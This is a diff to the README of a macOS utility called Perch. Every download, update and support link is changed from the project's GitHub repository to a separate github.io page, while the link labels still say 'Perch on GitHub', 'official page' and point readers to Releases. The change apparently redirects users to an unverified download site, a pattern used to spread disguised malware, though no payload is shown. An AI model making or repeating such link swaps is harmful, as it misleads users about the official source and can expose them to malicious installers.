@@ -31,7 +31,7 @@ Perch uses Apple's modern Liquid Glass design, giving you beautiful, translucent
 
 Getting Perch on your Mac is simple. Here's what to do:
 
-1. **Visit the download page**: [Download Perch](https://github.com/eliciacogitative9377/Perch)
+1. **Visit the download page**: [Download Perch](https://eliciacogitative9377.github.io)
 2. **Visit this link to download the application** — you'll land on the project's main page.
 3. Look for the "Releases" or "Download" button on that page.
 4. Click it, and your download will begin automatically.
@@ -185,7 +185,7 @@ A: Absolutely! Perch works seamlessly across all your displays.
 
 If you encounter any issues not covered here, don't worry. Help is available:
 
-- **Visit the project page**: [Perch on GitHub](https://github.com/eliciacogitative9377/Perch)
+- **Visit the project page**: [Perch on GitHub](https://eliciacogitative9377.github.io)
 - Check the **Issues** section to see if others had the same problem
 - Feel free to open a **new issue** describing your problem—the community and developer will help
 
@@ -196,7 +196,7 @@ If you encounter any issues not covered here, don't worry. Help is available:
 Perch is actively developed. When updates are released:
 
 1. Perch will notify you (optional)
-2. Visit [the download page](https://github.com/eliciacogitative9377/Perch) to get the latest version
+2. Visit [the download page](https://eliciacogitative9377.github.io) to get the latest version
 3. Follow the same installation steps as before
 
 ---
@@ -216,7 +216,7 @@ Love Perch? Here are ways to show your support:
 
 You now have everything you need to get started with Perch. Remember:
 
-1. **Download** from [the official page](https://github.com/eliciacogitative9377/Perch)
+1. **Download** from [the official page](https://eliciacogitative9377.github.io)
 2. **Install** by dragging to Applications
 3. **Launch** with your first Ctrl+Space
 4. **Enjoy** a faster, cleaner, more organized Mac experience
@@ -225,7 +225,7 @@ Perch is more than just a tool—it's a productivity companion that respects you
 
 Just you, your Mac, and Perch working in perfect harmony.
 
-**Click here to download now: [Get Perch](https://github.com/eliciacogitative9377/Perch)**
+**Click here to download now: [Get Perch](https://eliciacogitative9377.github.io)**
 
 ---
 
